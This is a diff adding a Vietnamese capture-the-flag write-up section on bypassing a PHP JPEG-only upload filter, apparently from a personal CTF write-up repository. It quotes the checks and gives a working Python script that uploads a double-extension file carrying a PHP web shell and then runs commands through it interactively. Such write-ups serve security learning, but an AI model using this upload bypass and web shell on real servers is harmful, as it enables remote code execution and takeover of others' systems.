@@ -61,6 +61,7 @@
 - [Baby Old Preg Voodoobug](#baby-old-preg-voodoobug)
 - [SQL Truncation Attack](#sql-truncation-attack)
 - [Baby Simple Go CURL](#baby-simple-go-curl)
+- [The Evil Assignment on Canvas](#the-evil-assignment-on-canvas)
 
 ## Baby Address Note
 
@@ -752,5 +753,63 @@ if c.ClientIP() != "127.0.0.1" && (strings.Contains(reqUrl, "flag") || strings.C
 ![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/2abb2670-33ac-4d55-9ef8-f41785e1a882)
 
 6. Sử dụng cổng 1337 vì trong docker cấu hình cổng kết nối với container là 1337.
+
+## The Evil Assignment on Canvas
+
+1. (Xem WU) Bài này là file upload mà chỉ cho phép upload file jpg. Với gợi ý magic header byte ta sẽ có hướng như sau: Chèn signature của jpg vào file. Với source code như sau:
+```
+$magic_num_handler = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+  if(bin2hex(substr($magic_num_handler, 0, 3)) != "ffd8ff")
+  {
+		      if(isset($_FILES['uploadedfile'])){
+     echo "<p>Sorry, your submission is not recognized as a JPEG file by the back-end!</p>";
+    }                 
+      exit;
+  }
+```
+
+2. Kiếm tra 3 byte đầu xem có phải sign của jpg không. Tiếp đến nó sẽ kiểm tra file name xem có chứa jpg, jpeg không (?) đơn giản bypass bằng cách dùng nhiều extentsion.
+```
+$fileName = pathinfo($_FILES['uploadedfile']['name'])['basename']; 
+  if (strpos($fileName, '.jpg') == false && strpos($fileName, '.jpeg') == false)
+  {
+		      if(isset($_FILES['uploadedfile'])){
+     echo "<p>Sorry, your submission is not recognized as a JPEG file by the back-end!</p>";
+    }                 
+      exit;
+  }
+```
+3. Khi đó, ta sẽ viết một đoạn code exploit như sau:
+```
+import requests
+import re
+from urllib.parse import quote
+
+url = "http://103.97.125.56:30301/"
+
+burp0_headers = {
+    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryijBAyAxAcQzDE3Xx"
+}
+burp0_data = """------WebKitFormBoundaryijBAyAxAcQzDE3Xx\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundaryijBAyAxAcQzDE3Xx\r\nContent-Disposition: form-data; name="uploadedfile"; filename="b.jpg.php"\r\nContent-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0\x00\x10JFIF<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>\r\n------WebKitFormBoundaryijBAyAxAcQzDE3Xx--\r\n"""
+r = requests.post(url + "/index.php", headers=burp0_headers, data=burp0_data)
+result = r.text
+if "File is valid" in result:
+    print("[+] Upload webshell complete.")
+else:
+    print("[!] Something went wrong while uploading webshell.")
+
+while True:
+    cmd = quote(input("[?] Command you want to run: "))
+    webshell = requests.get(url + f"/uploads/b.jpg.php?cmd={cmd}").text
+    result = (
+        re.search(r"<pre>(.*?)</pre>", webshell, re.DOTALL).group(1).strip()
+        if re.search(r"<pre>(.*?)</pre>", webshell, re.DOTALL)
+        else None
+    )
+    print(result)
+```
+
+4. Kết quả:
+![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/55d3920c-666d-4dcf-8beb-404d8af970aa)
 
 ## 
